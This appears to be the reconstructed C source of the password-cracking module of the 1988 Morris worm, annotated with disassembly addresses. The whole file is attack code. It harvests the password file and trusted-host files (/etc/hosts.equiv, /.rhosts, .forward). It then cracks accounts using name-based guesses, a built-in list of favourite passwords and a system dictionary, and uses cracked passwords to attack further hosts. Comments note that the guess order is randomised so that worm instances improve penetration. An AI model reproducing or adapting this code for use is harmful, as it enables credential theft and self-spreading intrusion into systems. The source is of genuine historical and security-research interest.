/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <pwd.h>
#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include "types.h"

int cmode = 0;
static struct muck *firstmp;	/* 11654 h_errno+2810 */
static struct muck *mp_1;	/* 11658 h_errno+2814 */
static FILE *wordf;	/* 1165c h_errno+2818 */
int nextw = 0;

/* drive the state machine */
cracksome() /* 3680 */
{
	switch (cmode) {
	case 0:
		crack_0();
		break;
	case 1:
		crack_1();	/* 3af0 */
		break;
	case 2:
		crack_2();	/* 3fe8 */
		break;
	case 3:
		crack_3();	/* 40f4 */
		break;
	default:
		break;
	}
}

#ifdef __MUCK__
/* defined in types.h: */
struct muck {
	char name[16];
	char crypted[14];
	char passwd[18];		/* just a guess */
	char *home;
	char *gecos;
	struct muck *next;
};
#endif

static
crack_0() /* 36cc cracksome+4c */
{
	FILE	*fp;
	struct	host *hostp;
	struct	passwd *pwd, *getpwent();
	struct	muck *muckp;
	int	cnt;
	char	buf1[256], buf2[256], buf3[256];
	char	*bp, *p, *malloc();

	/* read through hosts.equiv file for targets */
	fp = fopen(XS("/etc/hosts.equiv"), XS("r"));
	if (fp) {
		while (fscanf(fp, XS("%.100s"), buf1)) {
			/*
			 * Look it up; get addresses if new.
			 * Remember that it is an equivalent host
			 * (but only if we got its address).
			 */
			hostp = h_name2host(buf1, 0);
			if (hostp == NULL) {
				hostp = h_name2host(buf1, 1);
				getaddrs(hostp);
			}
			if (hostp->addrs[0])
				hostp->flags |= H_EQUIVHOST;
		}
		(void) fclose(fp);
	}

	/* do the same with /.rhosts */
	fp = fopen(XS("/.rhosts"), XS("r"));
	if (fp) {
		while (fgets(buf2, sizeof(buf2), fp) != 0) {
			if (sscanf(buf2, XS("%s"), buf1) != 1)
				continue;
			hostp = h_name2host(buf1, 0);
			if (hostp == NULL) {
				hostp = h_name2host(buf1, 1);
				getaddrs(hostp);
			}
			if (hostp->addrs[0])
				hostp->flags |= H_EQUIVHOST;
		}
		(void) fclose(fp);
	}

	/* read and store the password file */
	setpwent();
	cnt = 0;
	while ((pwd = getpwent()) != NULL) {
		if ((cnt++ % 10) == 0)
			other_sleep(0);
		/*
		 * Look for hosts in .forward files; consider these
		 * equivalent a la .rhosts and hosts.equiv files.
		 *
		 * We miss a bet here: it would probably be profitable
		 * to look at individual .rhosts files.
		 */
		sprintf(buf3, XS("%.200s/.forward"), pwd->pw_dir);
		fp = fopen(buf3, XS("r"));
		if (fp) {
			while (fgets(buf1, sizeof(buf1), fp) != NULL) {
				bp = &buf1[strlen(buf1) - 1];
				*bp = '\0';
				p = index(buf1, '@');
				if (p == NULL)
					continue;
				p++;
				hostp = h_name2host(p, 0);
				if (hostp == NULL) {
					hostp = h_name2host(p, 1);
					getaddrs(hostp);
				}
				if (hostp->addrs[0])
					hostp->flags |= H_EQUIVHOST;
			}
			fclose(fp);
		}
		/* store password entry, don't overflow buffers */
		if (strlen(pwd->pw_name) > 11)
			continue;
		muckp = (struct muck *)malloc(sizeof(*muckp));
		(void) strcpy(muckp->name, pwd->pw_name);
		if (strlen(pwd->pw_passwd) == 13)
			(void) strcpy(muckp->crypted, pwd->pw_passwd);
		else
			(void) strcpy(muckp->crypted, XS("x"));
		muckp->passwd[0] = '\0';
		muckp->home = strcpy(malloc(strlen(pwd->pw_dir) + 1),
			pwd->pw_dir);
		muckp->gecos = strcpy(malloc(strlen(pwd->pw_gecos) + 1),
			pwd->pw_gecos);
		muckp->next = firstmp;
		firstmp = muckp;
	}
	endpwent();
	/* go to next state */
	cmode = 1;
	mp_1 = firstmp;
}

/* try to crack some passwords using information from the password file */
static
crack_1() /* 3af0 cracksome+470 */
{
	int	i;
	char	acct[50];
	char	buf[50];

	for (i = 0; mp_1 && i < 50; i++, mp_1 = mp_1->next) {
		/* every 10 times around, check for clients */
		if ((i % 10) == 0)
			other_sleep(0);

		/* null password */
		if (try_password(mp_1, XS("")) != 0)
			continue;

		/* don't bother with bogus password entries */
		if (strlen(mp_1->crypted) != 13)
			continue;

		/* try the account name */
		strncpy(acct, mp_1->name, 49);
		acct[49] = '\0';
		if (try_password(mp_1, acct) != 0)
			continue;

		/* try account name concatenated with itself */
		sprintf(buf, XS("%.20s%.20s"), acct, acct);
		if (try_password(mp_1, buf) != 0)
			continue;

		/* try first name */
		sscanf(mp_1->gecos, XS("%[^ ,]"), buf);
		if (isupper(buf[0]))
			buf[0] = tolower(buf[0]);
		if (strlen(buf) > 3 && try_password(mp_1, buf) != 0)
			continue;

		/* try last name */
		buf[0] = 0;
		sscanf(mp_1->gecos, XS("%*s %[^ ,]s"), buf);
		if (isupper(buf[0]))
			buf[0] = tolower(buf[0]);
		if (strlen(buf) > 3 && index(buf, ',') == 0 &&
		    try_password(mp_1, buf) != 0)
			continue;

		/* invert the account name */
		reverse(acct, buf);
		(void) try_password(mp_1, buf);
	}

	/* when we finish with all the entries, try the next attack */
	if (mp_1 == 0)
		cmode = 2;
	return 0; /* sic */
}

/* copy s1 in reverse order into s2 */
static
reverse(s1, s2) /* 3d40 cracksome+6c0 */
	char *s1, *s2;
{
	int len;
	int i;

	len = strlen(s1);
	for (i = 0; i < len; ++i)
		s2[i] = s1[(len - i) - 1];
	s2[len] = '\0';
}

/* test a new clear password against an encrypted version */
static int
try_password(mp, word) /* 3d88 cracksome+708 */
	struct muck *mp;
	char *word;
{
	if (strcmp(mp->crypted, crypt(word, mp->crypted)) == 0 ||
	    (*word == '\0' && mp->crypted[0] == '\0')) {
		(void) strncpy(mp->passwd, word, 14);
		mp->passwd[14] = '\0';
		try_forward_and_rhosts(mp);
		return 1;
	}
	return 0;
}

/* attack hosts mentioned in a user's .forward and .rhosts files */
static
try_forward_and_rhosts(mp) /* 3dee cracksome+76e */
	struct muck *mp;
{
	FILE *f;
	char buf[512];
	char *cp;
	char sbuf[256];
	char username[512];
	struct host *hp;
	char *cp2;

	sprintf(buf, XS("%.200s/.forward"), mp->home);
	if (f = fopen(buf, XS("r"))) {
		while (fgets(buf, 512, f)) {
			cp2 = &buf[strlen(buf) - 1];
			*cp2 = '\0';
			if (cp = index(buf, '@')) {
				*cp++ = '\0';
				/* sic -- use lint! */
				hp = h_name2host(cp, 1, buf);
				hu1(mp, hp);
			}
		}
		fclose(f);
	}

	sprintf(buf, XS("%.200s/.rhosts"), mp->home);
	if (f = fopen(buf, XS("r"))) {
		while (fgets(sbuf, 256, f)) {
			username[0] = '\0';
			if (sscanf(sbuf, XS("%s%s"), buf, username) == 1) {
				hp = h_name2host(buf, 1);
				hu1(mp, hp, username);
			}
		}
		fclose(f);
	}
}

/* a hard-coded list of favorite passwords (from earlier successes?) */
/* these are cleartext except the high bit in each byte is turned on */
char *wds[433]; /* ba48 */

/* try some of our favorite passwords */
crack_2() /* 3fe8 cracksome+968 */
{
	struct	muck *mp;
	int	j;
	int	i;

	/* if we run out of passwords, try next attack */
	if (wds[nextw] == 0) {
		cmode++;
		return;
	}

	/* if this is the first time through, randomize password order;
	   this is so that multiple instances of the worm don't test
	   these passwords in the same order, improving penetration */
	if (nextw == 0) {
		for (j = 0; wds[j]; j++)
			;
		permute((char *)wds, j, 4);
	}

	/* the passwords are trivially encrypted by turning on the high bit */
	/* decrypt, test, re-encrypt this password */
	for (i = 0; wds[nextw][i] != 0; i++)
		wds[nextw][i] &= ~0x80;
	for (mp = firstmp; mp != 0; mp = mp->next)
		(void) try_password(mp, wds[nextw]);
	for (i = 0; wds[nextw][i]; i++)
		wds[nextw][i] |= 0x80;

	nextw++;
}

/* attack using dictionary words as passwords */
crack_3() /* 40f4 cracksome+a74 */
{
	char	buf[512];
	struct	muck *mp;
	char	*cp;

	/* if dictionary isn't open, open it */
	if (wordf == 0) {
		wordf = fopen(XS("/usr/dict/words"), XS("r"));
		if (wordf == 0)
			return;
	}

	/* get a null-terminated dictionary word */
	if (fgets(buf, sizeof(buf), wordf) == 0) {
		cmode++;
		return;
	}
	cp = &buf[strlen(buf)-1];
	*cp = 0;

	/* try this password on each account */
	for (mp = firstmp; mp != 0; mp = mp->next)
		(void) try_password(mp, buf);
	if (isupper(buf[0])) {
		buf[0] = tolower(buf[0]);
		for (mp = firstmp; mp != 0; mp = mp->next)
			(void) try_password(mp, buf);
	}
}

/* next function is crypt() 420c -- NOT the C library routine */
